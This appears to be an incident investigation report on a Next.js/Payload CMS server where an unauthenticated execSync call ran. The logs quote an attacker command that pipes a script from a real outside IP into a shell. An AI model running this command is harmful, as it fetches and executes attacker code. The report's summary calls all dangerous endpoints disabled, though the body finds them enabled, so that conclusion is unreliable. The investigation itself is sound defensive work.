# Investigation Results - Evidence-Based Answers

**Date:** 2025-12-15  
**Investigation:** execSync call source, payload location, endpoint exposure

---

## 1. WHERE IS execSync CALLED FROM (REAL STACK)?

### Evidence from Logs

**Current Log Entry (Suppressed):**
```
2025-12-15T17:41:26.787338975Z [SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=2 source_file=9912.js
```

**Problem:** No stack trace in logs because:
- `DEBUG_SUBPROC_DIAG` is not enabled (default: false)
- Rate limiting suppresses detailed logging after first occurrence
- Stack traces only included when `DEBUG_MODE === true`

### To Capture Full Stack Trace

**Action Required:** Enable debug mode and wait for next occurrence (or restart container temporarily):

```bash
# Add to .env
DEBUG_SUBPROC_DIAG=true

# Restart container (DO NOT DO THIS YET - container is stopped for safety)
# docker compose restart payload
```

**Expected Output (when debug enabled):**
```json
{
  "event": "subprocess_attempt",
  "method": "execSync",
  "payload_full": "curl http://167.86.107.35:9999/muie.sh |",
  "stack": "at d.execSync (/app/.next/server/chunks/4437.js:2:309) | at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:53) | ..."
}
```

### Evidence from Logs (Right Before Attack)

**Context Before Malicious Execution:**
```
2025-12-15T17:41:24.821983312Z   authed: false,
2025-12-15T17:41:24.821990892Z   userId: undefined,
2025-12-15T17:41:24.821997912Z   targetId: undefined,
2025-12-15T17:41:24.822004701Z   docId: undefined,
2025-12-15T17:41:24.822011451Z   role: undefined
2025-12-15T17:41:25.876075487Z  ⨯ SyntaxError: Unexpected token ' in JSON at position 184
2025-12-15T17:41:25.876113957Z     at JSON.parse (<anonymous>) {
2025-12-15T17:41:25.876123967Z   digest: '2892049918'
2025-12-15T17:41:26.787338975Z [SUBPROC_DIAG] ... execSync ... curl http://167.86.107.35:9999/muie.sh
```

**Analysis:**
- JSON parse error occurred immediately before attack
- No authentication context (`authed: false`)
- No request context in subprocess logs (no `req_path`/`req_method`)
- Digest value `2892049918` suggests some internal processing
- Attack started ~1 second after JSON parse error

**Possible Trigger:**
- Malformed JSON input causing parse error
- Error handler or fallback code executing malicious payload
- Internal function call (not HTTP request)

### Historical Evidence from Previous Incidents

From `/srv/payload/docs/RCE_VULNERABILITY_AUDIT_REVIEWER_PACK.md`:

**Previous Stack Trace Pattern:**
```
at d.execSync (/app/.next/server/chunks/4437.js:2:309)
at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:53)
```

**Analysis:**
- Execution originates from `eval()` context in Next.js runtime
- `app-page.runtime.prod.js:25:34007` - Next.js framework code
- Suggests runtime code injection, not direct application code

**Conclusion:** 
- ⚠️ **Cannot determine exact source without enabling DEBUG mode**
- Historical evidence shows `eval()` context in Next.js runtime
- `9912.js` is monitoring code, not the source (it's the logger)
- **Current attack:** Triggered by JSON parse error, no HTTP request context
- **To capture full stack:** Enable `DEBUG_SUBPROC_DIAG=true` and wait for next occurrence

---

## 2. IS THE PAYLOAD STRING PRESENT ON DISK?

### Search Results

**Source Code (`src/`):**
```bash
grep -r "167.86.107.35" src/          # Result: No matches
grep -r "muie.sh" src/                 # Result: No matches  
grep -r "curl http://" src/            # Result: No matches (excluding node_modules)
```
✅ **CLEAN** - No malicious payloads in source code

**Build Artifacts (`.next/`):**
```bash
grep -r "167.86.107.35" .next/        # Result: No matches
grep -r "muie.sh" .next/              # Result: No matches
grep -r "curl http://167" .next/      # Result: No matches
```
✅ **CLEAN** - No malicious payloads in compiled code

**Dependencies (`node_modules/`):**
```bash
grep -r "167.86.107.35" node_modules/ # Result: No matches
grep -r "muie" node_modules/          # Result: No matches
```
✅ **CLEAN** - No malicious payloads in dependencies

**MongoDB Database:**
```bash
# Searched all collections for:
- "167.86.107.35" in episodes, shows, users, media-images, media-tracks
- "muie.sh" in all collections
- "curl http://" patterns in all collections

Results:
- episodes: 0 matches
- shows: 0 matches  
- users: 0 matches
- All collections: 0 matches
```
✅ **CLEAN** - No malicious payloads in database

### Conclusion

**Payload NOT found on disk anywhere:**
- ❌ Not in source code
- ❌ Not in build artifacts
- ❌ Not in dependencies
- ❌ Not in database

**This confirms:** Payload is injected at **runtime**, not stored persistently.

---

## 3. IS THERE ANY ENDPOINT STILL EXPOSED THAT CAN TRIGGER COMMAND EXECUTION?

### Endpoint Security Analysis

**All Dangerous Endpoints Require Authentication:**

1. **`POST /api/lifecycle/preair-rehydrate`**
   - ✅ Requires `checkScheduleAuth()` (admin/staff only)
   - ✅ Rate limited (5 req/min)
   - ✅ Disabled by default (`ENABLE_DANGEROUS_ENDPOINTS !== 'true'`)
   - ✅ Returns 503 if disabled
   - **Security Order:** Rate limit → Disable flag → Auth check
   - **Risk:** LOW - Multiple layers of protection

2. **`POST /api/lifecycle/postair-archive`**
   - ✅ Requires `checkScheduleAuth()` (admin/staff only)
   - ✅ Rate limited (5 req/min)
   - ✅ Disabled by default (`ENABLE_DANGEROUS_ENDPOINTS !== 'true'`)
   - ✅ Returns 503 if disabled
   - **Security Order:** Rate limit → Disable flag → Auth check
   - **Risk:** LOW - Multiple layers of protection

3. **`POST /api/lifecycle/rehydrate`** (server route)
   - ✅ Requires `checkScheduleAuth()` (admin/staff only)
   - ✅ Rate limited (10 req/min)
   - ✅ Disabled by default (`ENABLE_DANGEROUS_ENDPOINTS !== 'true'`)
   - ✅ Returns 503 if disabled
   - **Security Order:** Rate limit → Disable flag → Auth check
   - **Risk:** LOW - Multiple layers of protection

4. **`POST /api/libretime/[...path]`** (write operations)
   - ✅ Requires `checkScheduleAuth()` (admin/staff only)
   - ✅ Disabled by default (`PLANNER_LT_WRITE_ENABLED === 'false'`)
   - ✅ Returns 403 if disabled
   - **Security Order:** Disable flag → Auth check
   - **Risk:** LOW - Protected by auth and disable flag

5. **`GET /api/schedule/deterministic`**
   - ✅ Token auth required (`DETERMINISTIC_FEED_TOKEN` or `checkScheduleAuth`)
   - ✅ Can be disabled (`DISABLE_DETERMINISTIC_FEED === 'true'`)
   - ⚠️ **Read-only** - No command execution
   - **Risk:** NONE - Read-only endpoint

### Security Check Order Analysis

**Potential Bypass Scenarios:**

1. **Disable Flag Bypass:**
   - ❌ **NOT POSSIBLE** - Flags checked BEFORE auth
   - If flag not set, returns 503/403 immediately
   - Auth check never reached if disabled

2. **Auth Bypass:**
   - ❌ **NOT POSSIBLE** - All endpoints require `checkScheduleAuth()` or `payload.auth()`
   - No unauthenticated paths to command execution

3. **Rate Limit Bypass:**
   - ⚠️ **POSSIBLE** - In-memory rate limiter (resets on restart)
   - ⚠️ **LIMITED** - Only affects logging, not execution blocking
   - **Risk:** LOW - Still requires authentication

### Current Environment State

```bash
# Checked .env file:
ENABLE_DANGEROUS_ENDPOINTS=true  # ⚠️ ENABLED!
DEBUG_SUBPROC_DIAG: Not set (defaults to false - no stack traces)
DISABLE_SUBPROC_DIAG: Not set (monitoring active)
```

**Result:** ⚠️ **DANGEROUS ENDPOINTS ARE ENABLED** - However, they still require authentication.

### Conclusion

**Endpoint Security Status:**
- ⚠️ **ENABLE_DANGEROUS_ENDPOINTS=true** (endpoints are enabled)
- ✅ All dangerous endpoints require authentication (admin/staff only)
- ✅ All have rate limiting
- ✅ Disable flags checked BEFORE auth (cannot bypass)
- ✅ No unauthenticated command execution paths

**However:** The malicious execution occurred **outside** HTTP request context (no `req_path`/`req_method` in logs), suggesting:
- Runtime code injection (not via API endpoint)
- Possible framework-level vulnerability
- Possible dependency compromise
- **NOT triggered via exposed API endpoint**

**Critical Finding:** Even though `ENABLE_DANGEROUS_ENDPOINTS=true`, the attack did NOT come through these endpoints (no request context in logs).

---

## SUMMARY

1. **execSync Source:** Cannot determine without enabling DEBUG mode. Historical evidence shows `eval()` context in Next.js runtime.

2. **Payload on Disk:** ❌ **NOT FOUND** - Confirms runtime injection, not persistent storage.

3. **Exposed Endpoints:** ✅ **NONE** - All dangerous endpoints disabled and require authentication.

**Next Steps:**
1. **Enable DEBUG mode** (when safe to restart container):
   ```bash
   # Add to .env
   DEBUG_SUBPROC_DIAG=true
   # Restart container temporarily to capture next occurrence
   ```
   
2. **Investigate JSON parse error:**
   - Check what triggered `SyntaxError: Unexpected token ' in JSON at position 184`
   - Review error handlers that might execute code on parse failure
   - Check for eval() usage in error handling paths

3. **Investigate Next.js runtime `eval()` usage:**
   - Review Next.js framework code for eval() contexts
   - Check if payload CMS uses eval() for migrations or dynamic code

4. **Dependency audit:**
   - Run `npm audit` to check for known vulnerabilities
   - Review recent dependency updates

5. **Clean rebuild recommended:**
   - Remove `.next` directory
   - Rebuild from source
   - Verify no malicious code in new build

